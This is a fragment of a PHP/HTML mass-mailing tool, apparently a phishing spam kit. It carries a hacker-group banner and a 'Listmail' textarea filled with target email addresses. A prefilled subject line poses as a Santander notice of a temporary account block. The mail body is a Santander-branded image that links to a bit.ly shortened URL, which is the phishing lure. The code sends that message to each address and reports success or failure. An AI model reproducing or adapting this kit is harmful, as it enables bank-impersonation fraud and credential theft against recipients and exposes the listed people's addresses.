...
echo "<font color=gren>* N&#1098;mero: $count <b>".$email[$i]."</b> <font 
color=gren>ENVIADO....!</font><br><hr>";
else
echo "<font color=red>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=red>ERRO AO 
ENVIAR</font><br><hr>";
$i++;
$count++;
}
...
<table border="0" width="53%" bordercolorlight="#000000" bordercolordark="#000000" style="border: 1px 
ridge #1BF51F" bgcolor="black" >
<td width="462" height="25" align="center" bgcolor="#000000"><span class="titulo">M4NDR4K1Z1N - noix 
memo</span></td>
<tr align="left">
...
<td height="17"><input name="assunto" type="text" value="Aviso Santander,Bloqueio Temporario de seus Serviços. [Ticket ID: 303676]"class="form" id="assunto" style="width:100%" ></td>
</tr>
<tr align="center" bgcolor="#99CCFF">
<td height="20" colspan="2" bgcolor="#000000"><span class="texto">m4ndr4k1z1n - irc.byroe.net 
#THC</span></td>
</tr>
<tr align="right">
...
<br>
<br>
<big style="color: rgb(0, 0, 0);">Enviado
Via : </big>&nbsp; &nbsp; <a
 href=http://bit.ly/2nCFvy9"><img
 style="border: 0px solid ; width: 672px; height: 708px;"
 alt="Santander S/a"
 src="http://i.imgsafe.org/d911e396fd.png"></a><br>
<br>
<br>
</span>
</body>
...
coelhinhabranca@live.com
brasilpassagens@live.com
</tr>
<tr align="right">
<td height="136" colspan="2" valign="top"><br>
<textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="form" id="emails">

tikituinfo@gmail.com
tikitucash@hotmail.com</textarea>
<span class="alerta">*Listmail</span> </td>
</tr>
<tr>
<td height="26" align="right" valign="top" colspan="2"><input type="submit" name="Submit" id="enviar" 
value="Enviar"></td>
</tr>
</table>
</td>
